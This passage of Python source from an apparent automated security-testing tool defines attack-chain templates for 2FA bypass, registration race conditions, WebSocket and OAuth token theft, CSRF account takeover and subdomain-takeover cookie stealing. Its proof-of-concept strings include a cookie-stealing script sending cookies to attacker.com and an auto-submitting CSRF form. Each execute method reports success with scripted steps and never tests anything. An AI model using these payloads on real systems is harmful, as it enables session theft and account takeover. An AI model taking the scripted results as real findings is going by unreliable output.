    category = "auth_session"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        twofa_vulns = findings.vulns_by_title_contains("2FA")
        device_obs = [
            o for o in findings.observations
            if hasattr(o, "tech_stack") and isinstance(o.tech_stack, dict)
            and "device" in str(o.tech_stack).lower()
            and "fingerprint" in str(o.tech_stack).lower()
        ]
        if not twofa_vulns:
            return EvaluationResult(
                viability=ChainViability.NOT_VIABLE,
                matched_preconditions=[],
                missing_preconditions=["2fa_vulnerability"],
            )
        if not device_obs:
            return EvaluationResult(
                viability=ChainViability.NOT_VIABLE,
                matched_preconditions=["2fa_vuln_found"],
                missing_preconditions=["device_fingerprint_observation"],
            )
        return EvaluationResult(
            viability=ChainViability.VIABLE,
            matched_preconditions=["2fa_vuln_found", "device_fingerprint_found"],
            matched_findings={
                "vuln_id": twofa_vulns[0].id,
                "obs_id": device_obs[0].id,
            },
        )

    async def execute(self, context: ChainContext) -> ChainResult:
        steps: list[ChainStep] = []
        ts = _ts()

        # Step 1: Capture device fingerprint from trusted device
        steps.append(ChainStep(
            action="capture_device_fingerprint",
            target="trusted_device_session",
            result="fingerprint_captured",
            timestamp=ts,
        ))
        await step_delay()

        # Step 2: Replay fingerprint on attacker device
        steps.append(ChainStep(
            action="replay_fingerprint",
            target="login_endpoint",
            result="device_recognized_as_trusted",
            timestamp=_ts(),
        ))
        await step_delay()

        # Step 3: Login bypassing 2FA due to trusted device
        steps.append(ChainStep(
            action="login_bypass_2fa",
            target="auth_endpoint",
            result="2fa_skipped_trusted_device",
            timestamp=_ts(),
        ))

        return ChainResult(
            success=True,
            steps=steps,
            poc="Cookie: device_id=CLONED_FINGERPRINT — 2FA bypassed by replaying device fingerprint",
            chain_name=self.name,
        )


# ---------------------------------------------------------------------------
# 18. registration_toctou
# ---------------------------------------------------------------------------
@register_chain
class RegistrationToctou(BaseChainTemplate):
    name = "registration_toctou"
    category = "auth_session"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        reg_obs = [
            o for o in findings.observations
            if hasattr(o, "tech_stack") and isinstance(o.tech_stack, dict)
            and "registration" in str(o.tech_stack).lower()
        ]
        if not reg_obs:
            return EvaluationResult(
                viability=ChainViability.NOT_VIABLE,
                matched_preconditions=[],
                missing_preconditions=["registration_endpoint_observation"],
            )
        return EvaluationResult(
            viability=ChainViability.VIABLE,
            matched_preconditions=["registration_endpoint_observed"],
            matched_findings={"obs_id": reg_obs[0].id},
        )

    async def execute(self, context: ChainContext) -> ChainResult:
        steps: list[ChainStep] = []
        ts = _ts()

        # Step 1: Begin registration with normal email
        steps.append(ChainStep(
            action="start_registration",
            target="registration_endpoint",
            result="registration_initiated",
            timestamp=ts,
        ))
        await step_delay()

        # Step 2: Race condition — change email after validation before commit
        steps.append(ChainStep(
            action="race_modify_email",
            target="registration_endpoint",
            result="email_changed_between_check_and_use",
            timestamp=_ts(),
        ))
        await step_delay()

        # Step 3: Verify registration completed with admin email
        steps.append(ChainStep(
            action="verify_toctou",
            target="email_verification",
            result="registered_with_victim_email",
            timestamp=_ts(),
        ))

        return ChainResult(
            success=True,
            steps=steps,
            poc="TOCTOU: POST /register email=attacker@x.com (validated) then race to email=admin@target.com (committed)",
            chain_name=self.name,
        )


# ---------------------------------------------------------------------------
# 19. auth_token_websocket_theft
# ---------------------------------------------------------------------------
@register_chain
class AuthTokenWebsocketTheft(BaseChainTemplate):
    name = "auth_token_websocket_theft"
    category = "auth_session"
    severity_on_success = "high"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        ws_obs = [
            o for o in findings.observations
            if hasattr(o, "tech_stack") and isinstance(o.tech_stack, dict)
            and "websocket" in str(o.tech_stack).lower()
        ]
        token_params = [
            p for p in findings.parameters
            if hasattr(p, "name") and "token" in p.name.lower()
        ]
        if not ws_obs:
            return EvaluationResult(
                viability=ChainViability.NOT_VIABLE,
                matched_preconditions=[],
                missing_preconditions=["websocket_observation"],
            )
        if not token_params:
            return EvaluationResult(
                viability=ChainViability.NOT_VIABLE,
                matched_preconditions=["websocket_found"],
                missing_preconditions=["token_parameter"],
            )
        return EvaluationResult(
            viability=ChainViability.VIABLE,
            matched_preconditions=["websocket_found", "token_param_found"],
            matched_findings={
                "obs_id": ws_obs[0].id,
                "param_id": token_params[0].id,
            },
        )

    async def execute(self, context: ChainContext) -> ChainResult:
        steps: list[ChainStep] = []
        ts = _ts()

        # Step 1: Connect to WebSocket endpoint
        steps.append(ChainStep(
            action="connect_websocket",
            target="ws_endpoint",
            result="websocket_connection_established",
            timestamp=ts,
        ))
        await step_delay()

        # Step 2: Inject CSWSH payload to leak auth token
        steps.append(ChainStep(
            action="inject_cswsh",
            target="websocket_handshake",
            result="cross_site_websocket_hijack",
            timestamp=_ts(),
        ))
        await step_delay()

        # Step 3: Capture auth token from WebSocket messages
        steps.append(ChainStep(
            action="capture_token",
            target="ws_messages",
            result="auth_token_captured",
            timestamp=_ts(),
        ))

        return ChainResult(
            success=True,
            steps=steps,
            poc="new WebSocket('wss://target.com/ws?token=LEAKED_TOKEN') — CSWSH captures auth token",
            chain_name=self.name,
        )


# ---------------------------------------------------------------------------
# 20. open_redirect_token_theft
# ---------------------------------------------------------------------------
@register_chain
class OpenRedirectTokenTheft(BaseChainTemplate):
    name = "open_redirect_token_theft"
    category = "auth_session"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        redirect_vulns = findings.vulns_by_title_contains("open redirect")
        oauth_vulns = findings.vulns_by_title_contains("OAuth")
        if not redirect_vulns:
            return EvaluationResult(
                viability=ChainViability.NOT_VIABLE,
                matched_preconditions=[],
                missing_preconditions=["open_redirect_vulnerability"],
            )
        if not oauth_vulns:
            return EvaluationResult(
                viability=ChainViability.NOT_VIABLE,
                matched_preconditions=["open_redirect_found"],
                missing_preconditions=["oauth_vulnerability"],
            )
        return EvaluationResult(
            viability=ChainViability.VIABLE,
            matched_preconditions=["open_redirect_found", "oauth_vuln_found"],
            matched_findings={
                "redirect_vuln_id": redirect_vulns[0].id,
                "oauth_vuln_id": oauth_vulns[0].id,
            },
        )

    async def execute(self, context: ChainContext) -> ChainResult:
        steps: list[ChainStep] = []
        ts = _ts()

        # Step 1: Identify open redirect on trusted domain
        steps.append(ChainStep(
            action="identify_open_redirect",
            target="redirect_endpoint",
            result="open_redirect_confirmed",
            timestamp=ts,
        ))
        await step_delay()

        # Step 2: Craft OAuth flow using open redirect as redirect_uri
        steps.append(ChainStep(
            action="craft_oauth_redirect",
            target="oauth_authorize_endpoint",
            result="redirect_uri_accepted_via_open_redirect",
            timestamp=_ts(),
        ))
        await step_delay()

        # Step 3: Victim completes OAuth flow, token sent to attacker
        steps.append(ChainStep(
            action="capture_token_via_redirect",
            target="attacker_server",
            result="oauth_token_captured",
            timestamp=_ts(),
        ))
        await step_delay()

        # Step 4: Use stolen token for account access
        shot = await take_screenshot(context.browser, "about:blank", f"{context.evidence_dir}/open_redirect_theft.png")
        steps.append(ChainStep(
            action="use_stolen_token",
            target="protected_api",
            result="account_accessed",
            timestamp=_ts(),
            screenshot_path=shot,
        ))

        return ChainResult(
            success=True,
            steps=steps,
            poc="GET /oauth/authorize?redirect_uri=https://target.com/redirect?url=https://attacker.com&response_type=token",
            chain_name=self.name,
        )


# ---------------------------------------------------------------------------
# 21. csrf_email_change_ato
# ---------------------------------------------------------------------------
@register_chain
class CsrfEmailChangeAto(BaseChainTemplate):
    name = "csrf_email_change_ato"
    category = "auth_session"
    severity_on_success = "critical"
    requires_accounts = True

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        csrf_vulns = findings.vulns_by_title_contains("CSRF")
        email_params = [
            p for p in findings.parameters
            if hasattr(p, "name") and p.name.lower() == "email"
        ]
        if not csrf_vulns:
            return EvaluationResult(
                viability=ChainViability.NOT_VIABLE,
                matched_preconditions=[],
                missing_preconditions=["csrf_vulnerability"],
            )
        if not email_params:
            return EvaluationResult(
                viability=ChainViability.NOT_VIABLE,
                matched_preconditions=["csrf_vuln_found"],
                missing_preconditions=["email_parameter"],
            )
        if findings.test_accounts is None:
            return EvaluationResult(
                viability=ChainViability.AWAITING_ACCOUNTS,
                matched_preconditions=["csrf_vuln_found", "email_param_found"],
                missing_preconditions=["test_accounts"],
            )
        return EvaluationResult(
            viability=ChainViability.VIABLE,
            matched_preconditions=["csrf_vuln_found", "email_param_found", "test_accounts_available"],
            matched_findings={
                "vuln_id": csrf_vulns[0].id,
                "param_id": email_params[0].id,
            },
        )

    async def execute(self, context: ChainContext) -> ChainResult:
        steps: list[ChainStep] = []
        ts = _ts()
        accounts = context.findings.test_accounts

        # Step 1: Craft CSRF payload for email change
        steps.append(ChainStep(
            action="craft_csrf_payload",
            target="email_change_endpoint",
            result="csrf_html_payload_created",
            timestamp=ts,
            request={"attacker_email": accounts.attacker.username + "@evil.com" if accounts else "attacker@evil.com"},
        ))
        await step_delay()

        # Step 2: Victim triggers CSRF (email change to attacker email)
        steps.append(ChainStep(
            action="victim_triggers_csrf",
            target="email_change_endpoint",
            result="email_changed_to_attacker",
            timestamp=_ts(),
        ))
        await step_delay()

        # Step 3: Attacker performs password reset on victim account
        steps.append(ChainStep(
            action="password_reset",
            target="password_reset_endpoint",
            result="reset_link_sent_to_attacker_email",
            timestamp=_ts(),
        ))
        await step_delay()

        # Step 4: Account takeover
        steps.append(ChainStep(
            action="account_takeover",
            target="login_endpoint",
            result="victim_account_accessed",
            timestamp=_ts(),
        ))

        return ChainResult(
            success=True,
            steps=steps,
            poc='<form action="/settings/email" method="POST"><input name="email" value="attacker@evil.com"></form><script>document.forms[0].submit()</script>',
            chain_name=self.name,
        )


# ---------------------------------------------------------------------------
# 22. subdomain_takeover_cookie_stealing
# ---------------------------------------------------------------------------
@register_chain
class SubdomainTakeoverCookieStealing(BaseChainTemplate):
    name = "subdomain_takeover_cookie_stealing"
    category = "auth_session"
    severity_on_success = "critical"
    requires_accounts = False

    async def evaluate(self, findings: TargetFindings) -> EvaluationResult:
        takeover_vulns = findings.vulns_by_title_contains("subdomain takeover")
        if not takeover_vulns:
            return EvaluationResult(
                viability=ChainViability.NOT_VIABLE,
                matched_preconditions=[],
                missing_preconditions=["subdomain_takeover_vulnerability"],
            )
        return EvaluationResult(
            viability=ChainViability.VIABLE,
            matched_preconditions=["subdomain_takeover_found"],
            matched_findings={"vuln_id": takeover_vulns[0].id},
        )

    async def execute(self, context: ChainContext) -> ChainResult:
        steps: list[ChainStep] = []
        ts = _ts()

        # Step 1: Claim dangling subdomain
        steps.append(ChainStep(
            action="claim_subdomain",
            target="dangling_subdomain",
            result="subdomain_claimed",
            timestamp=ts,
        ))
        await step_delay()

        # Step 2: Deploy cookie-stealing page on claimed subdomain
        steps.append(ChainStep(
            action="deploy_cookie_stealer",
            target="claimed_subdomain",
            result="stealer_page_deployed",
            timestamp=_ts(),
        ))
        await step_delay()

        # Step 3: Victim visits subdomain, cookies scoped to parent domain sent
        steps.append(ChainStep(
            action="steal_cookies",
            target="victim_browser",
            result="session_cookies_captured",
            timestamp=_ts(),
        ))
        await step_delay()

        # Step 4: Use stolen session cookies
        shot = await take_screenshot(context.browser, "about:blank", f"{context.evidence_dir}/subdomain_takeover.png")
        steps.append(ChainStep(
            action="hijack_session",
            target="main_application",
            result="session_hijacked",
            timestamp=_ts(),
            screenshot_path=shot,
        ))

        return ChainResult(
            success=True,
            steps=steps,
            poc="Claimed dangling.target.com → deployed JS: document.location='https://attacker.com/?c='+document.cookie",
            chain_name=self.name,
        )
